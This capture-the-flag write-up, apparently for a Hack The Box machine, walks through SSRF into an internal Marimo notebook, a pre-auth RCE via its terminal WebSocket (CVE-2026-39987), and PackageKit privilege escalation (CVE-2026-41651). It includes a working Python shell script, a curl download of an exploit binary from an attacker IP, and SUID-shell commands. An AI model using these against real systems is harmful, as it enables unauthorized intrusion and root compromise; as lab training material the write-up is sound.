### 1. Overview
This machine involved exploiting a Server-Side Request Forgery (SSRF) vulnerability to bypass external restrictions and access an internal `Marimo` reactive notebook. From there, a pre-authentication remote code execution vulnerability (`CVE-2026-39987`) was used to gain an initial shell. Privilege escalation was achieved by exploiting a race condition in the `PackageKit` daemon, known as `Pack2TheRoot` (`CVE-2026-41651`), to secure a root shell.

The `/status` endpoint responded with a new subdomain, so I added that to my hosts file and then went to it. This subdomain greeted me with a login screen asking for an access token/password. The title of this page was named `marimo`, so looking into that, Marimo is an open-source reactive Python notebook. 

Looking for an exploit to try, I came across `CVE-2026-39987`. This was a pre-authentication remote code execution vulnerability in its terminal WebSocket endpoint (`/terminal/ws`). 

To exploit this vulnerability I wrote the following script to drop me into an interactive shell:
```
import socket, ssl, threading

s = socket.create_connection(("nb-1be3782a8afd3ad5.cohort.htb", 443))
ws = ssl._create_unverified_context().wrap_socket(s)

ws.sendall(
    b"GET /terminal/ws HTTP/1.1\r\n"
    b"Host: nb-1be3782a8afd3ad5.cohort.htb\r\n"
    b"Upgrade: websocket\r\n"
    b"Connection: Upgrade\r\n"
    b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    b"Sec-WebSocket-Version: 13\r\n\r\n"
)
ws.recv(4096)

def send(c):
    p = c.encode()
    ws.sendall(b"\x81" + bytes([0x80 | len(p)]) + b"\x01\x02\x03\x04" + bytes(b ^ [1,2,3,4][i%4] for i, b in enumerate(p)))

def recv():
    while True:
        try:
            d = ws.recv(4096)
            if not d: break
            if d[0] == 0x81: d = d[2:]
            print(d.decode('utf-8', 'ignore'), end='', flush=True)
        except: break

threading.Thread(target=recv, daemon=True).start()

send("\n")
while True:
    send(input() + "\n")
```

### 4. Root
Now that I had a foothold on the machine, I could start enumeration for a priv esc vector. My standard enumeration tactics failed as I didnt have the password for this user to try the `sudo -l` command. The `/opt` folder was also pretty useless to me here. 

Instead I decided to try looking at the installed packages via `dpkg` since I recently heard about a vulnerability called "Pack2TheRoot":
```
marimo@cohort:~$ dpkg -l | grep packagekit
�ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5                                 amd64        GObject introspection data for the PackageKit GLib library�
ii  libpackagekit-glib2-18:amd64          1.2.8-2ubuntu1.5                                 amd64        Library for accessing PackageKit using GLib
hi  packagekit                            1.2.8-2ubuntu1.2                                 amd64        Provides a package management service
ii  packagekit-tools                      1.2.8-2ubuntu1.2                                 amd64        Provides PackageKit command-line tools
```

Seeing `packagekit` version `1.2.8-2ubuntu1.2`, I knew this machine was vulnerable to `CVE-2026-41651`. This vulnerability exists due to a race condition in the PackageKit daemon that allows an unprivileged user to manipulate transaction flags. Because the daemon reads these flags late in the execution process, an attacker can bypass password authorization checks and drop a root shell.

Now that I knew this machine was vulnerable to the Pack2TheRoot exploit, I used the `exploit.bin` file from a public POC (chisbaaa204/Pack2theRoot on github) to exploit this. 

This first thing I needed to do was send the file to the target and make it executable:
```
marimo@cohort:/tmp$ curl -s http://10.10.15.89/exploit.bin -o /tmp/exploit.bin
marimo@cohort:/tmp$ chmod +x exploit.bin
```

Next I needed to execute the binary in the background while removing every failed attempt:
```
marimo@cohort:/tmp$ /tmp/exploit.bin >/dev/null 2>&1 &
```

Finally, I simply had to wait a couple of seconds and then check to see if the exploit worked:
```
marimo@cohort:/tmp$ ls -l /tmp/.suid_bash
-rwsr-xr-x 1 root root 1446024 Aug 16 04:07 /tmp/.suid_bash
```

After that, I could simply drop into a root shell:
```
marimo@cohort:/tmp$ /tmp/.suid_bash -p
.suid_bash-5.2#
```
### 5. Conclusion
Initial access was gained by exploiting an SSRF vulnerability to bypass localhost filters, which allowed access to an internal Marimo reactive notebook. From there, a pre-authentication remote code execution vulnerability (CVE-2026-39987) was exploited to provide an interactive shell as the `marimo` user.

Privilege escalation was achieved by identifying a vulnerable version of the PackageKit daemon. Exploiting the Pack2TheRoot race condition (CVE-2026-41651) allowed for the creation of a SUID bash binary in the `/tmp` directory, resulting in full administrative access to the machine.
